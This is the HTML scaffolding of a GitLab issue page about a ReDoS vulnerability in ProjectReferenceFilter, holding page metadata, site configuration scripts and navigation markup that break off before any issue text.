





<!DOCTYPE html>
<html class="gl-light ui-neutral with-top-bar with-header " lang="en">
<head prefix="og: http://ogp.me/ns#">
<meta charset="utf-8">
<meta content="IE=edge" http-equiv="X-UA-Compatible">
<meta content="width=device-width, initial-scale=1" name="viewport">
<title>ReDoS via ProjectReferenceFilter in any Markdown fields (#416225) · Issues · GitLab.org / GitLab · GitLab</title>
<script nonce="PbUfvTZ5F3qTmEKt++iLGw==">
//<![CDATA[
window.gon={};gon.api_version="v4";gon.default_avatar_url="https://gitlab.com/assets/no_avatar-849f9c04a3a0d0cea2424ae97b27447dc64a7dbfae83c036c45b403392f0e8ba.png";gon.max_file_size=100;gon.asset_host=null;gon.webpack_public_path="/assets/webpack/";gon.relative_url_root="";gon.user_color_mode="gl-light";gon.user_color_scheme="white";gon.markdown_surround_selection=null;gon.markdown_automatic_lists=null;gon.math_rendering_limits_enabled=true;gon.analytics_url="https://collector.prd-278964.gl-product-analytics.com";gon.analytics_id="715db59f-f350-4bfd-aef8-e7a7f0c023f0";gon.sentry_dsn="https://f5573e26de8f4293b285e556c35dfd6e@new-sentry.gitlab.net/4";gon.sentry_environment="gprd";gon.sentry_clientside_traces_sample_rate=0.05;gon.recaptcha_api_server_url="https://www.recaptcha.net/recaptcha/api.js";gon.recaptcha_sitekey="6LfAERQTAAAAAL4GYSiAMGLbcLyUIBSfPrDNJgeC";gon.gitlab_url="https://gitlab.com";gon.promo_url="https://about.gitlab.com";gon.forum_url="https://forum.gitlab.com";gon.docs_url="https://docs.gitlab.com";gon.revision="488dae4a227";gon.feature_category="team_planning";gon.gitlab_logo="/assets/gitlab_logo-2957169c8ef64c58616a1ac3f4fc626e8a35ce4eb3ed31bb0d873712f2a041a0.png";gon.secure=true;gon.sprite_icons="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg";gon.sprite_file_icons="/assets/file_icons/file_icons-7cd3d6c3b29a6d972895f36472978a4b5adb4b37f9b5d0716a380e82389f7e0e.svg";gon.emoji_sprites_css_path="/assets/emoji_sprites-bd26211944b9d072037ec97cb138f1a52cd03ef185cd38b8d1fcc963245199a1.css";gon.emoji_backend_version=4;gon.gridstack_css_path="/assets/lazy_bundles/gridstack-5fcfd4ffbea1db04eaf7f16521bcab19ae3af042c8b4afe8d16781eda5a70799.css";gon.test_env=false;gon.disable_animations=null;gon.suggested_label_colors={"#cc338b":"Magenta-pink","#dc143c":"Crimson","#c21e56":"Rose red","#cd5b45":"Dark coral","#ed9121":"Carrot orange","#eee600":"Titanium yellow","#009966":"Green-cyan","#8fbc8f":"Dark sea green","#6699cc":"Blue-gray","#e6e6fa":"Lavender","#9400d3":"Dark violet","#330066":"Deep violet","#36454f":"Charcoal grey","#808080":"Gray"};gon.first_day_of_week=0;gon.time_display_relative=true;gon.time_display_format=0;gon.ee=true;gon.jh=false;gon.dot_com=true;gon.uf_error_prefix="UF";gon.pat_prefix="glpat-";gon.keyboard_shortcuts_enabled=true;gon.diagramsnet_url="https://embed.diagrams.net";gon.features={"sourceEditorToolbar":false,"vscodeWebIde":true,"uiForOrganizations":false,"organizationSwitching":false,"findAndReplace":false,"removeMonitorMetrics":true,"workItemsViewPreference":false,"searchButtonTopRight":false,"duoChatDynamicDimension":false,"advancedContextResolver":true,"preserveMarkdown":false,"issuesGridView":false,"serviceDeskTicket":false,"issuesListDrawer":false,"notificationsTodosButtons":false,"glqlIntegration":true,"workItemsBeta":true,"workItemsAlpha":false,"workItems":true,"epicWidgetEditConfirmation":false,"namespaceLevelWorkItems":false,"okrsMvc":false,"workItemEpics":true};gon.roadmap_epics_limit=1000;gon.subscriptions_url="https://customers.gitlab.com";gon.subscriptions_legacy_sign_in_url="https://customers.gitlab.com/customers/sign_in?legacy=true";gon.billing_accounts_url="https://customers.gitlab.com/billing_accounts";gon.payment_form_url="https://customers.gitlab.com/payment_forms/cc_validation";gon.payment_validation_form_id="payment_method_validation";gon.licensed_features={"escalationPolicies":true,"okrs":true};gon.abilities={"summarizeComments":false,"measureCommentTemperature":false};
//]]>
</script>


<script nonce="PbUfvTZ5F3qTmEKt++iLGw==">
//<![CDATA[
var gl = window.gl || {};
gl.startup_calls = {"/gitlab-org/gitlab/-/issues/416225/related_branches":{},"/gitlab-org/gitlab/-/issues/416225/discussions.json?per_page=20":{},"/gitlab-org/gitlab/-/issues/416225.json?serializer=sidebar_extras":{}};
gl.startup_graphql_calls = [{"query":"query getDesignList($fullPath: ID!, $iid: String!, $atVersion: DesignManagementVersionID) {\n  project(fullPath: $fullPath) {\n    __typename\n    id\n    issue(iid: $iid) {\n      __typename\n      id\n      designCollection {\n        __typename\n        copyState\n        designs(atVersion: $atVersion) {\n          __typename\n          nodes {\n            __typename\n            id\n            event\n            filename\n            notesCount\n            image\n            imageV432x230\n            currentUserTodos(state: pending) {\n              __typename\n              nodes {\n                __typename\n                id\n              }\n            }\n          }\n        }\n        versions {\n          __typename\n          nodes {\n            __typename\n            id\n            sha\n            createdAt\n            author {\n              __typename\n              id\n              name\n              avatarUrl\n            }\n          }\n        }\n      }\n    }\n  }\n}\n","variables":{"fullPath":"gitlab-org/gitlab","iid":"416225","atVersion":null}},{"query":"query permissions($fullPath: ID!, $iid: String!) {\n  project(fullPath: $fullPath) {\n    __typename\n    id\n    issue(iid: $iid) {\n      __typename\n      id\n      userPermissions {\n        __typename\n        createDesign\n      }\n    }\n  }\n}\n","variables":{"fullPath":"gitlab-org/gitlab","iid":"416225"}}];

if (gl.startup_calls && window.fetch) {
  Object.keys(gl.startup_calls).forEach(apiCall => {
   gl.startup_calls[apiCall] = {
      fetchCall: fetch(apiCall, {
        // Emulate XHR for Rails AJAX request checks
        headers: {
          'X-Requested-With': 'XMLHttpRequest'
        },
        // fetch won’t send cookies in older browsers, unless you set the credentials init option.
        // We set to `same-origin` which is default value in modern browsers.
        // See https://github.com/whatwg/fetch/pull/585 for more information.
        credentials: 'same-origin'
      })
    };
  });
}
if (gl.startup_graphql_calls && window.fetch) {
  const headers = {"X-CSRF-Token":"xMTujuLfor7FnRhZshLFG_YNG5uK2EiF9J_vcoIYCJgGn7diokbsTPtCsYK5vO3A8rWdglV1ybqDPLIrIUNpeQ","x-gitlab-feature-category":"team_planning"};
  const url = `https://gitlab.com/api/graphql`

  const opts = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      ...headers,
    }
  };

  gl.startup_graphql_calls = gl.startup_graphql_calls.map(call => ({
    ...call,
    fetchCall: fetch(url, {
      ...opts,
      credentials: 'same-origin',
      body: JSON.stringify(call)
    })
  }))
}


//]]>
</script>



<link rel="stylesheet" href="/assets/application-3ac16694767839eb5e86660635af7a58d98adbf48dd11dbf3d42f80beff008ee.css" />
<link rel="stylesheet" href="/assets/page_bundles/design_management-f20ae9b5b8c9a0f793e3ffa2ddc13953bfd683e1d351c8e6cc75e0fcd4ddde90.css" /><link rel="stylesheet" href="/assets/page_bundles/incidents-b9f383aefa56f0a72990496e4a4b3aaf2c525843283a1c0c3d85876537187397.css" /><link rel="stylesheet" href="/assets/page_bundles/issuable-e25480d2326300d5c49ad31dbd847a53e39fc33a5fd595a961dd7238e411b558.css" /><link rel="stylesheet" href="/assets/page_bundles/notes_shared-7e727ab1e91b421915feadeb04a1b9d57213cb1b2f8f56f4d894b34d6b42e9b3.css" /><link rel="stylesheet" href="/assets/page_bundles/issues_show-785541c300108b8ecf7c08fd02bd67f4d6b9d59c86918ecfbf91bae5e1c8ffa8.css" /><link rel="stylesheet" href="/assets/page_bundles/work_items-22a76cdd1fe2ae5431b7ff603f86212acaf81b49c4a932f19e3b3222dc1881ee.css" /><link rel="stylesheet" href="/assets/page_bundles/labels-3508460b8d6f839e9d60de1f2065fdaf7f057efab04cf71966acef6a86fe9b41.css" /><link rel="stylesheet" href="/assets/page_bundles/commit_description-1e2cba4dda3c7b30dd84924809020c569f1308dea51520fe1dd5d4ce31403195.css" />
<link rel="stylesheet" href="/assets/application_utilities-58bec0f2dc46133fc9e8548af9854688398e9d7263cc0fd95ec5739f2a069dec.css" />
<link rel="stylesheet" href="/assets/tailwind-a8e5b0535de73a879328f71591ca7dd4543085546e884fde0de4eec36aa07517.css" />


<link rel="stylesheet" href="/assets/fonts-fae5d3f79948bd85f18b6513a025f863b19636e85b09a1492907eb4b1bb0557b.css" />
<link rel="stylesheet" href="/assets/highlight/themes/white-e31d355458ead69f8798dbb62f54c60c4ccc7db35289cbbd2353ddfdf5109aac.css" />

<script src="/assets/webpack/runtime.46b197d6.bundle.js" defer="defer" nonce="PbUfvTZ5F3qTmEKt++iLGw=="></script>
<script src="/assets/webpack/main.07687e59.chunk.js" defer="defer" nonce="PbUfvTZ5F3qTmEKt++iLGw=="></script>
<script src="/assets/webpack/tracker.493c474d.chunk.js" defer="defer" nonce="PbUfvTZ5F3qTmEKt++iLGw=="></script>
<script src="/assets/webpack/analytics.4c4c0b50.chunk.js" defer="defer" nonce="PbUfvTZ5F3qTmEKt++iLGw=="></script>
<script nonce="PbUfvTZ5F3qTmEKt++iLGw==">
//<![CDATA[
window.snowplowOptions = {"namespace":"gl","hostname":"snowplowprd.trx.gitlab.net","cookieDomain":".gitlab.com","appId":"gitlab","formTracking":true,"linkClickTracking":true}

gl = window.gl || {};
gl.snowplowStandardContext = {"schema":"iglu:com.gitlab/gitlab_standard/jsonschema/1-1-1","data":{"environment":"production","source":"gitlab-rails","correlation_id":"01JH8PW1X8E7W46AN38DTTFNMN","plan":"gold","extra":{},"user_id":null,"global_user_id":null,"is_gitlab_team_member":null,"namespace_id":9970,"project_id":278964,"feature_enabled_by_namespace_ids":null,"realm":"saas","instance_id":"ea8bf810-1d6f-4a6a-b4fd-93e8cbd8b57f","host_name":"gitlab-cny-webservice-web-8495d44694-nfmk4","instance_version":"17.8.0","context_generated_at":"2025-01-10T18:15:53.233Z"}}
gl.snowplowPseudonymizedPageUrl = "https://gitlab.com/namespace9970/project278964/-/issues/416225";
gl.maskedDefaultReferrerUrl = null;
gl.ga4MeasurementId = 'G-ENFH3X7M5Y';


//]]>
</script>
<link rel="preload" href="/assets/application_utilities-58bec0f2dc46133fc9e8548af9854688398e9d7263cc0fd95ec5739f2a069dec.css" as="style" type="text/css" nonce="AWdFb2/kSfonmGmRyjTV9Q==">
<link rel="preload" href="/assets/application-3ac16694767839eb5e86660635af7a58d98adbf48dd11dbf3d42f80beff008ee.css" as="style" type="text/css" nonce="AWdFb2/kSfonmGmRyjTV9Q==">
<link rel="preload" href="/assets/highlight/themes/white-e31d355458ead69f8798dbb62f54c60c4ccc7db35289cbbd2353ddfdf5109aac.css" as="style" type="text/css" nonce="AWdFb2/kSfonmGmRyjTV9Q==">
<link crossorigin="" href="https://snowplowprd.trx.gitlab.net" rel="preconnect">
<link as="font" crossorigin="" href="/assets/gitlab-sans/GitLabSans-1e0a5107ea3bbd4be93e8ad2c503467e43166cd37e4293570b490e0812ede98b.woff2" rel="preload">
<link as="font" crossorigin="" href="/assets/gitlab-sans/GitLabSans-Italic-38eaf1a569a54ab28c58b92a4a8de3afb96b6ebc250cf372003a7b38151848cc.woff2" rel="preload">
<link as="font" crossorigin="" href="/assets/gitlab-mono/GitLabMono-08d2c5e8ff8fd3d2d6ec55bc7713380f8981c35f9d2df14e12b835464d6e8f23.woff2" rel="preload">
<link as="font" crossorigin="" href="/assets/gitlab-mono/GitLabMono-Italic-38e58d8df29485a20c550da1d0111e2c2169f6dcbcf894f2cd3afbdd97bcc588.woff2" rel="preload">
<link rel="preload" href="/assets/fonts-fae5d3f79948bd85f18b6513a025f863b19636e85b09a1492907eb4b1bb0557b.css" as="style" type="text/css" nonce="AWdFb2/kSfonmGmRyjTV9Q==">



<script src="/assets/webpack/sentry.b707854c.chunk.js" defer="defer" nonce="PbUfvTZ5F3qTmEKt++iLGw=="></script>

<script src="/assets/webpack/10.983bd1ac.chunk.js" defer="defer" nonce="PbUfvTZ5F3qTmEKt++iLGw=="></script>
<script src="/assets/webpack/12.0b1b07c1.chunk.js" defer="defer" nonce="PbUfvTZ5F3qTmEKt++iLGw=="></script>
<script src="/assets/webpack/14.629d03c2.chunk.js" defer="defer" nonce="PbUfvTZ5F3qTmEKt++iLGw=="></script>
<script src="/assets/webpack/commons-pages.groups.analytics.dashboards-pages.groups.harbor.repositories-pages.groups.iteration_ca-b07ae190.ec7189d6.chunk.js" defer="defer" nonce="PbUfvTZ5F3qTmEKt++iLGw=="></script>
<script src="/assets/webpack/commons-pages.groups.new-pages.import.gitlab_projects.new-pages.import.manifest.new-pages.projects.n-44c6c18e.570d5e43.chunk.js" defer="defer" nonce="PbUfvTZ5F3qTmEKt++iLGw=="></script>
<script src="/assets/webpack/commons-pages.search.show-super_sidebar.f7a558c9.chunk.js" defer="defer" nonce="PbUfvTZ5F3qTmEKt++iLGw=="></script>
<script src="/assets/webpack/super_sidebar.566fc613.chunk.js" defer="defer" nonce="PbUfvTZ5F3qTmEKt++iLGw=="></script>
<script src="/assets/webpack/commons-pages.projects-pages.projects.activity-pages.projects.alert_management.details-pages.project-bce54798.33350df1.chunk.js" defer="defer" nonce="PbUfvTZ5F3qTmEKt++iLGw=="></script>
<script src="/assets/webpack/pages.projects.issues.show.3ad61df3.chunk.js" defer="defer" nonce="PbUfvTZ5F3qTmEKt++iLGw=="></script>

<meta content="object" property="og:type">
<meta content="GitLab" property="og:site_name">
<meta content="ReDoS via ProjectReferenceFilter in any Markdown fields (#416225) · Issues · GitLab.org / GitLab · GitLab" property="og:title">
<meta content="⚠ Please read the process on how to fix security issues before starting to work on the issue. Vulnerabilities must be..." property="og:description">
<meta content="https://gitlab.com/uploads/-/system/project/avatar/278964/project_avatar.png" property="og:image">
<meta content="64" property="og:image:width">
<meta content="64" property="og:image:height">
<meta content="https://gitlab.com/gitlab-org/gitlab/-/issues/416225" property="og:url">
<meta content="summary" property="twitter:card">
<meta content="ReDoS via ProjectReferenceFilter in any Markdown fields (#416225) · Issues · GitLab.org / GitLab · GitLab" property="twitter:title">
<meta content="⚠ Please read the process on how to fix security issues before starting to work on the issue. Vulnerabilities must be..." property="twitter:description">
<meta content="https://gitlab.com/uploads/-/system/project/avatar/278964/project_avatar.png" property="twitter:image">
<meta property="twitter:label1" content="Author"><meta property="twitter:data1" content="GitLab SecurityBot"><meta property="twitter:label2" content="Assignee"><meta property="twitter:data2" content="Brett Walker">
<meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="C3nBN4F9uSRj_JsWhe6D1z8OymLrLBSJJjpsn4NM2k_JIpjbweT31l0jMs2OQKsMO7ZMezSBlbZRmTHGIBe7rg" />
<meta name="csp-nonce" content="PbUfvTZ5F3qTmEKt++iLGw==" />
<meta name="action-cable-url" content="/-/cable" />
<link href="/-/manifest.json" rel="manifest">
<link rel="icon" type="image/png" href="/assets/favicon-yellow-018213ceb87b472388095d0264be5b4319ef47471dacea03c83ecc233ced2fd5.png" id="favicon" data-original-href="/assets/favicon-yellow-018213ceb87b472388095d0264be5b4319ef47471dacea03c83ecc233ced2fd5.png" />
<link rel="apple-touch-icon" type="image/x-icon" href="/assets/apple-touch-icon-b049d4bc0dd9626f31db825d61880737befc7835982586d015bded10b4435460.png" />
<link href="/search/opensearch.xml" rel="search" title="Search GitLab" type="application/opensearchdescription+xml">




<meta content="⚠ Please read the process on how to fix security issues before starting to work on the issue. Vulnerabilities must be..." name="description">
<meta content="#ececef" name="theme-color">
</head>

<body class="tab-width-8 gl-browser-chrome gl-platform-windows" data-group="gitlab-org" data-group-full-path="gitlab-org" data-namespace-id="9970" data-page="projects:issues:show" data-page-type-id="416225" data-project="gitlab" data-project-full-path="gitlab-org/gitlab" data-project-id="278964">
<script nonce="PbUfvTZ5F3qTmEKt++iLGw==">
//<![CDATA[
gl = window.gl || {};
gl.GfmAutoComplete = gl.GfmAutoComplete || {};
gl.GfmAutoComplete.dataSources = {"epics":"/gitlab-org/gitlab/-/autocomplete_sources/epics","iterations":"/gitlab-org/gitlab/-/autocomplete_sources/iterations","vulnerabilities":"/gitlab-org/gitlab/-/autocomplete_sources/vulnerabilities","members":"/gitlab-org/gitlab/-/autocomplete_sources/members?type=Issue\u0026type_id=416225","issues":"/gitlab-org/gitlab/-/autocomplete_sources/issues","mergeRequests":"/gitlab-org/gitlab/-/autocomplete_sources/merge_requests","labels":"/gitlab-org/gitlab/-/autocomplete_sources/labels?type=Issue\u0026type_id=416225","milestones":"/gitlab-org/gitlab/-/autocomplete_sources/milestones","commands":"/gitlab-org/gitlab/-/autocomplete_sources/commands?type=Issue\u0026type_id=416225","snippets":"/gitlab-org/gitlab/-/autocomplete_sources/snippets","contacts":"/gitlab-org/gitlab/-/autocomplete_sources/contacts?type=Issue\u0026type_id=416225","wikis":null};


//]]>
</script>
<script nonce="PbUfvTZ5F3qTmEKt++iLGw==">
//<![CDATA[
gl = window.gl || {};
gl.client = {"isChrome":true,"isWindows":true};


//]]>
</script>


<header class="header-logged-out" data-testid="navbar">
<a class="gl-sr-only gl-accessibility" href="#content-body">Skip to content</a>
<div class="container-fluid">
<nav aria-label="Explore GitLab" class="header-logged-out-nav gl-flex gl-gap-3 gl-justify-between">
<div class="gl-flex gl-items-center gl-gap-1">
<span class="gl-sr-only">GitLab</span>
<a title="Homepage" id="logo" class="header-logged-out-logo has-tooltip" aria-label="Homepage" data-track-label="main_navigation" data-track-action="click_gitlab_logo_link" data-track-property="navigation_top" href="/"><svg aria-hidden="true" role="img" class="tanuki-logo" width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path class="tanuki-shape tanuki" d="m24.507 9.5-.034-.09L21.082.562a.896.896 0 0 0-1.694.091l-2.29 7.01H7.825L5.535.653a.898.898 0 0 0-1.694-.09L.451 9.411.416 9.5a6.297 6.297 0 0 0 2.09 7.278l.012.01.03.022 5.16 3.867 2.56 1.935 1.554 1.176a1.051 1.051 0 0 0 1.268 0l1.555-1.176 2.56-1.935 5.197-3.89.014-.01A6.297 6.297 0 0 0 24.507 9.5Z"
        fill="#E24329"/>
  <path class="tanuki-shape right-cheek" d="m24.507 9.5-.034-.09a11.44 11.44 0 0 0-4.56 2.051l-7.447 5.632 4.742 3.584 5.197-3.89.014-.01A6.297 6.297 0 0 0 24.507 9.5Z"
        fill="#FC6D26"/>
  <path class="tanuki-shape chin" d="m7.707 20.677 2.56 1.935 1.555 1.176a1.051 1.051 0 0 0 1.268 0l1.555-1.176 2.56-1.935-4.743-3.584-4.755 3.584Z"
        fill="#FCA326"/>
  <path class="tanuki-shape left-cheek" d="M5.01 11.461a11.43 11.43 0 0 0-4.56-2.05L.416 9.5a6.297 6.297 0 0 0 2.09 7.278l.012.01.03.022 5.16 3.867 4.745-3.584-7.444-5.632Z"
        fill="#FC6D26"/>
</svg>

</a><a class="gl-badge badge badge-pill badge-success canary-badge" data-testid="canary_badge_link" href="https://next.gitlab.com" rel="noopener noreferrer" target="_blank"><span class="gl-badge-content">Next
</span></a></div>
<ul class="gl-list-none gl-p-0 gl-m-0 gl-flex gl-gap-3 gl-items-center gl-grow">
<li class="header-logged-out-nav-item header-logged-out-dropdown md:gl-hidden">
<button class="header-logged-out-toggle" data-toggle="dropdown" type="button">
<span class="gl-sr-only">
Menu
</span>
<svg class="s16" data-testid="hamburger-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#hamburger"></use></svg>
</button>
<div class="dropdown-menu">
<ul>
<li>
<a href="https://about.gitlab.com/why-gitlab">Why GitLab
</a></li>
<li>
<a href="https://about.gitlab.com/pricing">Pricing
</a></li>
<li>
<a href="https://about.gitlab.com/sales">Contact Sales
</a></li>
<li>
<a href="/explore">Explore</a>
</li>
</ul>
</div>
</li>
<li class="header-logged-out-nav-item gl-hidden md:gl-inline-block">
<a href="https://about.gitlab.com/why-gitlab">Why GitLab
</a></li>
<li class="header-logged-out-nav-item gl-hidden md:gl-inline-block">
<a href="https://about.gitlab.com/pricing">Pricing
</a></li>
<li class="header-logged-out-nav-item gl-hidden gl-inline-block">
<a href="https://about.gitlab.com/sales">Contact Sales
</a></li>
<li class="header-logged-out-nav-item gl-hidden md:gl-inline-block">
<a class="" href="/explore">Explore</a>
</li>
</ul>
<ul class="gl-list-none gl-p-0 gl-m-0 gl-flex gl-gap-3 gl-items-center gl-justify-end">
<li class="header-logged-out-nav-item">
<a href="/users/sign_in?redirect_to_referer=yes">Sign in</a>
</li>
<li class="header-logged-out-nav-item">
<a class="gl-button btn btn-md btn-confirm !gl-inline-flex" href="/users/sign_up"><span class="gl-button-text">
Get free trial

</span>

</a></li>
</ul>
</nav>
</div>
</header>

<div class="layout-page page-gutter right-sidebar-expanded page-with-super-sidebar">
<aside class="js-super-sidebar super-sidebar super-sidebar-loading" data-command-palette="{&quot;project_files_url&quot;:&quot;/gitlab-org/gitlab/-/files/master?format=json&quot;,&quot;project_blob_url&quot;:&quot;/gitlab-org/gitlab/-/blob/master&quot;}" data-force-desktop-expanded-sidebar="" data-is-saas="true" data-root-path="/" data-sidebar="{&quot;whats_new_most_recent_release_items_count&quot;:6,&quot;whats_new_version_digest&quot;:&quot;c955dbe1b30a1468b032fe6896086eda50f884ff9559d966e5ef75c34eee3ff0&quot;,&quot;is_logged_in&quot;:false,&quot;context_switcher_links&quot;:[{&quot;title&quot;:&quot;Explore&quot;,&quot;link&quot;:&quot;/explore&quot;,&quot;icon&quot;:&quot;compass&quot;}],&quot;current_menu_items&quot;:[{&quot;id&quot;:&quot;project_overview&quot;,&quot;title&quot;:&quot;GitLab&quot;,&quot;avatar&quot;:&quot;/uploads/-/system/project/avatar/278964/project_avatar.png&quot;,&quot;entity_id&quot;:278964,&quot;link&quot;:&quot;/gitlab-org/gitlab&quot;,&quot;link_classes&quot;:&quot;shortcuts-project&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;manage_menu&quot;,&quot;title&quot;:&quot;Manage&quot;,&quot;icon&quot;:&quot;users&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/activity&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;activity&quot;,&quot;title&quot;:&quot;Activity&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/activity&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-activity&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;members&quot;,&quot;title&quot;:&quot;Members&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/project_members&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;labels&quot;,&quot;title&quot;:&quot;Labels&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/labels&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;plan_menu&quot;,&quot;title&quot;:&quot;Plan&quot;,&quot;icon&quot;:&quot;planning&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;,&quot;is_active&quot;:true,&quot;items&quot;:[{&quot;id&quot;:&quot;project_issue_list&quot;,&quot;title&quot;:&quot;Issues&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;,&quot;pill_count_field&quot;:&quot;openIssuesCount&quot;,&quot;link_classes&quot;:&quot;shortcuts-issues has-sub-items&quot;,&quot;is_active&quot;:true},{&quot;id&quot;:&quot;boards&quot;,&quot;title&quot;:&quot;Issue boards&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/boards&quot;,&quot;link_classes&quot;:&quot;shortcuts-issue-boards&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;milestones&quot;,&quot;title&quot;:&quot;Milestones&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/milestones&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;iterations&quot;,&quot;title&quot;:&quot;Iterations&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/cadences&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;requirements&quot;,&quot;title&quot;:&quot;Requirements&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/requirements_management/requirements&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;code_menu&quot;,&quot;title&quot;:&quot;Code&quot;,&quot;icon&quot;:&quot;code&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/merge_requests&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;project_merge_request_list&quot;,&quot;title&quot;:&quot;Merge requests&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/merge_requests&quot;,&quot;pill_count_field&quot;:&quot;openMergeRequestsCount&quot;,&quot;link_classes&quot;:&quot;shortcuts-merge_requests&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;files&quot;,&quot;title&quot;:&quot;Repository&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/tree/master&quot;,&quot;link_classes&quot;:&quot;shortcuts-tree&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;branches&quot;,&quot;title&quot;:&quot;Branches&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/branches&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;commits&quot;,&quot;title&quot;:&quot;Commits&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/commits/master?ref_type=heads&quot;,&quot;link_classes&quot;:&quot;shortcuts-commits&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;tags&quot;,&quot;title&quot;:&quot;Tags&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/tags&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;graphs&quot;,&quot;title&quot;:&quot;Repository graph&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/network/master?ref_type=heads&quot;,&quot;link_classes&quot;:&quot;shortcuts-network&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;compare&quot;,&quot;title&quot;:&quot;Compare revisions&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/compare?from=master\u0026to=master&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;project_snippets&quot;,&quot;title&quot;:&quot;Snippets&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/snippets&quot;,&quot;link_classes&quot;:&quot;shortcuts-snippets&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;file_locks&quot;,&quot;title&quot;:&quot;Locked files&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/path_locks&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;build_menu&quot;,&quot;title&quot;:&quot;Build&quot;,&quot;icon&quot;:&quot;rocket&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipelines&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;pipelines&quot;,&quot;title&quot;:&quot;Pipelines&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipelines&quot;,&quot;link_classes&quot;:&quot;shortcuts-pipelines&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;jobs&quot;,&quot;title&quot;:&quot;Jobs&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/jobs&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;pipeline_schedules&quot;,&quot;title&quot;:&quot;Pipeline schedules&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipeline_schedules&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;test_cases&quot;,&quot;title&quot;:&quot;Test cases&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/quality/test_cases&quot;,&quot;link_classes&quot;:&quot;shortcuts-test-cases&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;artifacts&quot;,&quot;title&quot;:&quot;Artifacts&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/artifacts&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;deploy_menu&quot;,&quot;title&quot;:&quot;Deploy&quot;,&quot;icon&quot;:&quot;deployments&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/releases&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;releases&quot;,&quot;title&quot;:&quot;Releases&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/releases&quot;,&quot;link_classes&quot;:&quot;shortcuts-deployments-releases&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;packages_registry&quot;,&quot;title&quot;:&quot;Package Registry&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/packages&quot;,&quot;link_classes&quot;:&quot;shortcuts-container-registry&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;container_registry&quot;,&quot;title&quot;:&quot;Container Registry&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/container_registry&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;model_registry&quot;,&quot;title&quot;:&quot;Model 